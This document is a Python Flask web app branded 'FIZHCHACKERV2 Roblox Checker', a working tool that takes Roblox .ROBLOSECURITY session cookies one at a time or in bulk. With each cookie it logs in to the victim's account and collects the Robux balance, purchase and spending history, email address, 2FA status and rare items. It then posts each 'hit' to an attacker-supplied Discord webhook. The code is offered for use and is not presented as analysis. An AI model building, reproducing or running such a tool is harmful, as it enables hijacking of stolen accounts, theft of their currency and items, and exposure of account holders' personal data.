from flask import Flask, render_template, request, jsonify
import requests
from datetime import datetime

app = Flask(__name__, template_folder='../templates')

@app.route('/')
def index():
    return render_template('index.html')

def get_game_icon(universe_id):
    if not universe_id:
        return "https://tr.rbxcdn.com/3943ed2d7908c104bfd9d24268e390c5/150/150/Image/Png"
    try:
        url = f"https://thumbnails.roblox.com/v1/games/icons?universeIds={universe_id}&size=150x150&format=Png&isCircular=false"
        res = requests.get(url, timeout=5)
        if res.status_code == 200:
            data = res.json().get('data', [])
            if data:
                return data[0].get('imageUrl', '')
    except:
        pass
    return "https://tr.rbxcdn.com/3943ed2d7908c104bfd9d24268e390c5/150/150/Image/Png"

def get_asset_icon(asset_id):
    if not asset_id:
        return "https://tr.rbxcdn.com/3943ed2d7908c104bfd9d24268e390c5/150/150/Image/Png"
    try:
        url = f"https://thumbnails.roblox.com/v1/assets?assetIds={asset_id}&size=150x150&format=Png&isCircular=false"
        res = requests.get(url, timeout=5)
        if res.status_code == 200:
            data = res.json().get('data', [])
            if data:
                return data[0].get('imageUrl', '')
    except:
        pass
    return "https://tr.rbxcdn.com/3943ed2d7908c104bfd9d24268e390c5/150/150/Image/Png"

def get_user_avatar(user_id):
    default_avatar = "https://tr.rbxcdn.com/3943ed2d7908c104bfd9d24268e390c5/150/150/Image/Png"
    try:
        url = f"https://thumbnails.roblox.com/v1/users/avatar?userIds={user_id}&size=420x420&format=Png&isCircular=false"
        res = requests.get(url, timeout=5)
        if res.status_code == 200:
            data = res.json().get('data', [])
            if data:
                return data[0].get('imageUrl', default_avatar)
    except:
        pass
    return default_avatar

def process_single_cookie(cookie, webhook_url):
    clean_cookie = cookie.strip()
    if not clean_cookie.startswith(".ROBLOSECURITY="):
        cookies_header = { '.ROBLOSECURITY': clean_cookie }
    else:
        # Handle if cookie string includes key name
        actual_val = clean_cookie.split("=")[1] if "=" in clean_cookie else clean_cookie
        cookies_header = { '.ROBLOSECURITY': actual_val }

    headers = { 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Referer": "https://www.roblox.com/"
    }
    
    try:
        user_info_res = requests.get("https://users.roblox.com/v1/users/authenticated", cookies=cookies_header, headers=headers, timeout=6)
        if user_info_res.status_code != 200:
            return {"status": "invalid", "cookie": clean_cookie[:20] + "..."}
        
        user_data = user_info_res.json()
        user_id = user_data.get('id')
        username = user_data.get('name')

        avatar_url = get_user_avatar(user_id)

        created_at_str = "Unknown"
        account_age_days = 0
        try:
            profile_res = requests.get(f"https://users.roblox.com/v1/users/{user_id}", headers=headers, timeout=5)
            if profile_res.status_code == 200:
                p_data = profile_res.json()
                created_at_raw = p_data.get('created')
                if created_at_raw:
                    dt = datetime.fromisoformat(created_at_raw.replace("Z", "+00:00"))
                    created_at_str = dt.strftime("%d %b %Y")
                    account_age_days = (datetime.now(dt.tzinfo) - dt).days
        except:
            pass

        robux_res = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", cookies=cookies_header, headers=headers, timeout=5)
        robux_balance = robux_res.json().get('robux', 0) if robux_res.status_code == 200 else 0

        total_purchased_robux = 0
        try:
            p_res = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/transactions?transactionType=Purchases&limit=100", cookies=cookies_header, headers=headers, timeout=5)
            if p_res.status_code == 200:
                for tx in p_res.json().get('data', []):
                    currency = tx.get('currency', {})
                    amount = currency.get('amount', 0)
                    if amount > 0:
                        total_purchased_robux += amount
        except:
            pass

        # Perbaikan Endpoint Email Status
        email_status = "Not Verified"
        try:
            email_res = requests.get("https://accountinformation.roblox.com/v1/email", cookies=cookies_header, headers=headers, timeout=5)
            if email_res.status_code == 200:
                e_data = email_res.json()
                is_verified = e_data.get('verified', False) or e_data.get('isVerified', False)
                email_address = e_data.get('emailAddress', '')
                if is_verified:
                    email_status = f"Verified ({email_address})" if email_address else "Verified"
                else:
                    email_status = "Unverified"
        except:
            pass

        # Perbaikan Endpoint 2FA / A2F Status
        has_a2f = False
        try:
            a2f_res = requests.get(f"https://twostepverification.roblox.com/v1/users/{user_id}/configuration", cookies=cookies_header, headers=headers, timeout=5)
            if a2f_res.status_code == 200:
                a2f_data = a2f_res.json()
                if (a2f_data.get('email', {}).get('isEnabled', False) or 
                    a2f_data.get('authenticator', {}).get('isEnabled', False) or 
                    a2f_data.get('securityKey', {}).get('isEnabled', False) or
                    a2f_data.get('isEnabled', False)):
                    has_a2f = True
        except:
            pass

        # Perbaikan Spent History & Game
        total_game_spent = 0
        game_spending_map = {}
        game_universe_map = {}
        try:
            spending_res = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/transactions?transactionType=Purchases&limit=100", cookies=cookies_header, headers=headers, timeout=5)
            if spending_res.status_code == 200:
                for tx in spending_res.json().get('data', []):
                    currency = tx.get('currency', {})
                    amount = currency.get('amount', 0)
                    if amount < 0:
                        amt_abs = abs(amount)
                        details = tx.get('details', {})
                        game_name = details.get('name', 'Roblox Item / Game')
                        universe_id = details.get('universeId')
                        if universe_id:
                            game_universe_map[game_name] = universe_id
                        total_game_spent += amt_abs
                        game_spending_map[game_name] = game_spending_map.get(game_name, 0) + amt_abs
        except:
            pass

        spent_history_list = []
        for gname, spent_amt in sorted(game_spending_map.items(), key=lambda x: x[1], reverse=True)[:3]:
            u_id = game_universe_map.get(gname)
            icon_url = get_game_icon(u_id) if u_id else "https://tr.rbxcdn.com/3943ed2d7908c104bfd9d24268e390c5/150/150/Image/Png"
            spent_history_list.append({"name": gname, "spent": spent_amt, "icon": icon_url})

        # Perbaikan Recent Games
        recent_games_list = []
        try:
            games_res = requests.get(f"https://games.roblox.com/v2/users/{user_id}/games?limit=3&sortOrder=Desc", headers=headers, timeout=5)
            if games_res.status_code == 200:
                for g in games_res.json().get('data', []):
                    g_name = g.get('name', 'Roblox Game')
                    universe_id = g.get('id')
                    g_icon = get_game_icon(universe_id)
                    recent_games_list.append({"name": g_name, "icon": g_icon})
        except:
            pass

        rap_total = 0
        has_korblox = False
        has_headless = False

        try:
            collectibles_res = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=100", headers=headers, timeout=5)
            if collectibles_res.status_code == 200:
                for item in collectibles_res.json().get('data', []):
                    rap_total += item.get('recentAveragePrice', 0)
                    asset_id = item.get('assetId')
                    if asset_id == 1924105: has_korblox = True
                    if asset_id == 134082567: has_headless = True
        except:
            pass

        # Perbaikan Animations Inventory
        animation_list = []
        try:
            # Asset type 38 = Animations / Bundles
            inv_res = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/inventory/38?limit=10", cookies=cookies_header, headers=headers, timeout=5)
            if inv_res.status_code == 200:
                for b in inv_res.json().get('data', []):
                    b_id = b.get('assetId') or b.get('id')
                    b_name = b.get('name', 'Animation Pack')
                    b_icon = get_asset_icon(b_id)
                    animation_list.append({"name": b_name, "icon": b_icon})
        except:
            pass

        if not animation_list:
            animation_list.append({"name": "Default Animation", "icon": "https://tr.rbxcdn.com/3943ed2d7908c104bfd9d24268e390c5/150/150/Image/Png"})

        if webhook_url:
            discord_payload = {
                "content": "@everyone **🔥 FIZHCHACKERV2 Roblox Checker Hit! 🔥**",
                "embeds": [{
                    "title": f"👤 {username} (ID: {user_id})",
                    "color": 0x6366f1,
                    "thumbnail": { "url": avatar_url },
                    "fields": [
                        {"name": "🪙 Current Robux", "value": f"**{robux_balance}** R$", "inline": True},
                        {"name": "💳 Total Purchases", "value": f"**+{total_purchased_robux}** R$", "inline": True},
                        {"name": "💸 Total Spent", "value": f"**-{total_game_spent}** R$", "inline": True},
                        {"name": "📊 Total RAP", "value": f"**{rap_total}** R$", "inline": True},
                        {"name": "📅 Account Age", "value": f"`{created_at_str}`\n({account_age_days} Days)", "inline": True},
                        {"name": "📧 Email Status", "value": f"`{email_status}`", "inline": True},
                        {"name": "🔒 Security A2F", "value": f"`{'Active' if has_a2f else 'Inactive'}`", "inline": True},
                        {"name": "💀 Rare Items", "value": f"Korblox: `{'Yes' if has_korblox else 'No'}` | Headless: `{'Yes' if has_headless else 'No'}`", "inline": False}
                    ],
                    "footer": { "text": "FIZHCHACKERV2 • Ultimate Avatar Engine" },
                    "timestamp": datetime.utcnow().isoformat()
                }]
            }
            try:
                requests.post(webhook_url, json=discord_payload, timeout=5)
            except:
                pass

        return {
            "status": "valid", 
            "username": username, 
            "id": user_id, 
            "avatar_url": avatar_url,
            "robux": robux_balance, 
            "total_purchased": total_purchased_robux,
            "rap": rap_total,
            "total_spent": total_game_spent,
            "created_at": created_at_str,
            "account_age_days": account_age_days,
            "email_status": email_status,
            "a2f_status": has_a2f,
            "spent_history": spent_history_list,
            "recent_games": recent_games_list,
            "animations": animation_list,
            "korblox": has_korblox,
            "headless": has_headless
        }
    except Exception as e:
        return {"status": "error", "cookie": clean_cookie[:20] + "...", "message": str(e)}

@app.route('/api/check', methods=['POST'])
def run_check_mode():
    webhook_url = request.form.get('webhook_url', '').strip()
    mode = request.form.get('mode', 'single')
    results = []

    if mode == 'single':
        cookie = request.form.get('cookie', '').strip()
        if not cookie:
            return jsonify({"status": "error", "message": "Cookie tidak boleh kosong!"}), 400
        results.append(process_single_cookie(cookie, webhook_url))
        
    elif mode == 'bulk':
        file = request.files.get('file')
        if not file:
            return jsonify({"status": "error", "message": "File dokumen belum diunggah!"}), 400
        
        file_content = file.read().decode('utf-8', errors='ignore')
        cookies_list = [line.strip() for line in file_content.splitlines() if line.strip()]
        
        for c in cookies_list[:10]:
            results.append(process_single_cookie(c, webhook_url))

    return jsonify({"status": "success", "mode": mode, "results": results})
